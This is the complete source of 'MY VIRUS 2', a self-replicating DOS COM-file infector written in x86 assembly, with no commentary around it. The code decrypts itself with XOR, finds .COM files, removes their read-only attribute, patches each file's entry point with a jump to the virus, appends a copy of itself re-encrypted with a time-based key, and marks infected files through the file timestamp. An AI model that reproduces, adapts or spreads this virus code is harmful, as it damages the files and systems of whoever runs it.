;<  MY VIRUS 2 > 

	.MODEL tiny
	.stack
	.code  
	org 100h
start:
       jmp      sc

com_adr		EQU	100h+desc
real_start      EQU     desc
d_lng		EQU	7ch 
desc            EQU     324d
lng             EQU     393d

sc     PROC 
ha     DB       0BEh,046h,002h   
	mov	di,si
	Sub	di,012fh
	Mov	Dx,[Si+3bh]
	Mov	Cx,d_lng
Decod  PROC
	Xor	[Di],Dx	
	Inc	Di
	Inc	Di
Decod  ENDP
	Loop	Decod
	push    si
	add     si,56d 
	mov     cx,0003h
	mov     di,100h
	rep movsb
	pop     si
	mov     ah,1ah
	mov     dx,si
	add     dx,000dh
	int     21h
	mov     dx,1h
	add     dx,si
find_f PROC
	mov     ah,4eh
	mov     cx,00h
	int     21h  
find_f ENDP
	jmp     ok
find_n PROC
	mov     ah,4fh
	int     21h
find_n ENDP

ok     PROC
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg     PROC
	cmp     bp,65535d
dg     ENDP
	jnz     fg
	jmp     rt
fg     PROC
	dec     dx
fg     ENDP
	mov     bp,65535d
	jmp     find_f
ok     ENDP

chk    PROC
	mov     cx,[si+0dh+18h]
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [si+0dh+1ah],65000d
	ja      find_n
	cmp     word ptr [si+0dh+1ah],100h
	jb      find_n
	push    si
	mov     di,si
	add     di,0dh 
	add     si,02bh
	cmp     bp,65535d
	jnz     nam
	mov     al,5ch
	stosb
nam    PROC
	lodsb
	stosb
nam    ENDP
	cmp     al,00
	jnz     nam
	pop     si
	mov     dx,si
	add     dx,00dh
	mov     ax,4300h
	int     21h
	mov     word ptr [si+36h],cx 
	and     cx,0fffeh
	mov     ax,4301h
	int     21h
chk   ENDP       
	mov      ax,[si+0dh+1ah] ;====lengh of file to AX
	push     ax
	sub      ax,0003h
	mov      [si+3fh],ax ;==========new JMP to virus
	pop      ax 
	add      ax,com_adr ;===adding    
	mov      [si-(desc-01h)],ax ;===for compatabile 
	mov     al,02h               
	mov     ah,3dh
	int     21h                   
	jnb     ar
	jmp     rt
ar     PROC
	mov     bx,ax
ar     ENDP
	mov     ax,5700h
	int     21h
	mov     word ptr [si+0dh+34h],cx
	mov     word ptr [si+0dh+36h],dx
	mov     ax,4200h
	mov     cx,00h
	mov     dx,00h
	int     21h
	mov     ah,3fh
	mov     cx,0003h
	mov     dx,si
	add     dx,38h
	int     21h
	mov     ax,4200h
	xor     cx,cx
	xor     dx,dx
	int     21h
	mov     ax,4000h
	mov     cx,0003h
	mov     dx,3eh  
	add     dx,si        
	int     21h
	mov     ah,42h
	mov     al,02h
	mov     cx,00h
	mov     dx,00d
	int     21h
Coding PROC
	Mov	Ah,2ch
	Int	21h
	Mov	[Si+3bh],Dx
	Mov	Cx,d_lng
	Mov	Di,Si
	Sub	Di,012fh
Cycl   PROC
	Xor	[Di],Dx
	Inc	Di
	Inc	Di
Cycl   ENDP
	Loop	Cycl
Coding ENDP
	mov     dx,si
	sub     dx,real_start
	mov     cx,lng
	mov     ax,4000h
	int     21h                   
	mov     cx,[si+0dh+34h]
	mov     dx,[si+0dh+36h]
	and     dx,65055d
	or      dx,01a0h
	mov     ax,5701h
	int     21h
	mov     ah,3eh
	int     21h
rt     PROC
	xor	ax,ax
	xor	dx,dx
	xor	bx,bx
	mov     di,0100h
	push    di
	ret
rt     ENDP
sc      ENDP

vir    DB "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooo   �oooooo"

END start
END
